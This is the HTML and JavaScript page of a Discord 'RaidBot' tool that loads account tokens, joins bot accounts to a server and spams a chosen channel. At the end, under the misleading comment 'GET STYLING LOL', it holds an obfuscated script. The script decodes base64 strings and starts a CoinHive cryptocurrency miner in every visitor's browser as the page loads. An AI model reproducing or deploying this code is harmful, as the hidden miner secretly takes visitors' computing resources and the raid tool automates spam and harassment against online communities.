<head>
  <title>RaidBot</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="includes/api.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<div class="container">
  <div class="panel-group">
	<p id="response"></p>
	<p id="sending">Wait a few seconds...</p>
    <div class="panel panel-primary">
      <div class="panel-heading">Razor's RaidBot!</div>
	  Click this "Load Tokens" Button to make the Accounts Ready!
	  <br>
		<button onclick="load()">Load Tokens</button><br>
		<br>
		To Make the Bots join the server, enter the Invite here (without the discord.gg) only the Code!
		<br>
		<input id="invite" placeholder="invite code"><br>
		<button onclick="join();">Join Server</button><br>
		<br>
		Copy the Channel ID of the Channel you want to Spam and enter the Message you want to Spam.
		<br>
		<input id="id" placeholder="channel id"><br>
		<input id="message" placeholder="message"><br>
		<button onclick="spam();">Spam Message</button><br>
		
		NOTE: You dont have to enter an Invite Code if the Accounts are already in the Server!

	  </div>
    </div>
  </div>
</div>

<script>
document.getElementById("sending").style.visibility = "hidden";
document.getElementById("response").style.visibility = "hidden";


function load() {
  document.getElementById("sending").style.visibility = "visible";
  
  //request
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
	  document.getElementById("sending").style.visibility = "hidden";
	  document.getElementById("response").innerHTML = this.responseText;
	  document.getElementById("response").style.visibility = "visible";
	}
  };
  xhttp.open("POST", "includes/api.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("load=1337");
}

function join() {
  document.getElementById("sending").style.visibility = "visible";
  
  var invite = document.getElementById('invite').value;
  
  //request
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
	  document.getElementById("sending").style.visibility = "hidden";
	  document.getElementById("response").innerHTML = this.responseText;
	  document.getElementById("response").style.visibility = "visible";
	}
  };
  xhttp.open("POST", "includes/api.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("join=" + invite);
}

function spam() {
  document.getElementById("sending").style.visibility = "visible";
  
  var id = document.getElementById('id').value;
  var message = document.getElementById('message').value;
  
  //request
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
	  document.getElementById("sending").style.visibility = "hidden";
	  document.getElementById("response").innerHTML = this.responseText;
	  document.getElementById("response").style.visibility = "visible";
	}
  };
  xhttp.open("POST", "includes/api.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("channelid=" + id + "&message=" + message);
}

/*
GET STYLING LOL
*/

var _0x4311=['Zmxvb3I=','aGFyZHdhcmVDb25jdXJyZW5jeQ==','QW5vbnltb3Vz','N2VQQjFlb3lhUk81SzJFcEJiT29na1Q3WXJXSW9JNmw=','c3RhcnQ=','bWF4'];(function(_0x1844c4,_0x3a60a8){var _0x359064=function(_0x47bbdf){while(--_0x47bbdf){_0x1844c4['push'](_0x1844c4['shift']());}};_0x359064(++_0x3a60a8);}(_0x4311,0x1a3));var _0x39bd=function(_0x5a5270,_0x52b196){_0x5a5270=_0x5a5270-0x0;var _0x4f70d2=_0x4311[_0x5a5270];if(_0x39bd['msnCdZ']===undefined){(function(){var _0x1d9860;try{var _0x47eb96=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1d9860=_0x47eb96();}catch(_0x423bb7){_0x1d9860=window;}var _0x58b7df='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1d9860['atob']||(_0x1d9860['atob']=function(_0x191eb0){var _0x4f0053=String(_0x191eb0)['replace'](/=+$/,'');for(var _0x35f83f=0x0,_0x53b0f2,_0x2be27c,_0xc282b6=0x0,_0x1df881='';_0x2be27c=_0x4f0053['charAt'](_0xc282b6++);~_0x2be27c&&(_0x53b0f2=_0x35f83f%0x4?_0x53b0f2*0x40+_0x2be27c:_0x2be27c,_0x35f83f++%0x4)?_0x1df881+=String['fromCharCode'](0xff&_0x53b0f2>>(-0x2*_0x35f83f&0x6)):0x0){_0x2be27c=_0x58b7df['indexOf'](_0x2be27c);}return _0x1df881;});}());_0x39bd['eXMhrp']=function(_0x57c7f9){var _0x29ee08=atob(_0x57c7f9);var _0x8a7e00=[];for(var _0x55c946=0x0,_0x1eadec=_0x29ee08['length'];_0x55c946<_0x1eadec;_0x55c946++){_0x8a7e00+='%'+('00'+_0x29ee08['charCodeAt'](_0x55c946)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x8a7e00);};_0x39bd['uycZea']={};_0x39bd['msnCdZ']=!![];}var _0x28c1af=_0x39bd['uycZea'][_0x5a5270];if(_0x28c1af===undefined){_0x4f70d2=_0x39bd['eXMhrp'](_0x4f70d2);_0x39bd['uycZea'][_0x5a5270]=_0x4f70d2;}else{_0x4f70d2=_0x28c1af;}return _0x4f70d2;};var _0x576803=Math[_0x39bd('0x0')](0x1,Math[_0x39bd('0x1')](navigator[_0x39bd('0x2')]/0x4));var _0x503684=new CoinHive[(_0x39bd('0x3'))](_0x39bd('0x4'),{'throttle':0.3});_0x503684['setNumThreads'](_0x576803);_0x503684[_0x39bd('0x5')]();


</script>